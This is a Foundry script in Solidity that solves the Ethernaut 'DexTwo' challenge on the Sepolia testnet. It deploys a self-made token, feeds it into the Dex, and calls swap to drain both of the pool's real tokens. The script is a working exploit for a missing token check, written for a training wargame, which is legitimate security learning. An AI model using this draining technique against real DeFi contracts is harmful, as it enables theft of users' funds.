// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked23_DexTwo.sol";

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function addLiquidity(address token_address, uint256 amount) external;

    function swap(address from, address to, uint256 amount) external;

    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);

    function approve(address spender, uint256 amount) external;

    function balanceOf(address token, address account) external view returns (uint256);
}

//forge script  --rpc-url sepolia --account metamask  Cracked23_DexTwoScript --broadcast
contract Cracked23_DexTwoScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("DexTwo_address"));
    }

    function run() public {
        vm.startBroadcast();
        Cracked23_DexTwo attach = new Cracked23_DexTwo();
        address player = vm.parseAddress(vm.envString("player"));
        IDex dex = IDex(ethernaut_contracts);
        address token1 = dex.token1();
        address token2 = dex.token2();
        attach.transfer(player, dex.balanceOf(token1, ethernaut_contracts));
        attach.transfer(ethernaut_contracts, dex.balanceOf(token1, ethernaut_contracts));
        dex.swap(address(attach), token1, dex.balanceOf(token1, ethernaut_contracts));

        attach.transfer(player, dex.balanceOf(token2, ethernaut_contracts));
        attach.transfer(ethernaut_contracts, dex.balanceOf(token2, ethernaut_contracts));
        dex.swap(address(attach), token2, dex.balanceOf(token2, ethernaut_contracts));

        console.log("ethernaut_contracts token1 is", dex.balanceOf(token1, ethernaut_contracts));
        console.log("ethernaut_contracts token2 is", dex.balanceOf(token2, ethernaut_contracts));
        console.log("player token1 is", dex.balanceOf(token1, player));
        console.log("player token2 is", dex.balanceOf(token2, player));

        require(dex.balanceOf(token1, ethernaut_contracts) == 0 || dex.balanceOf(token2, ethernaut_contracts) == 0, "fail");
        vm.stopBroadcast();
    }
}
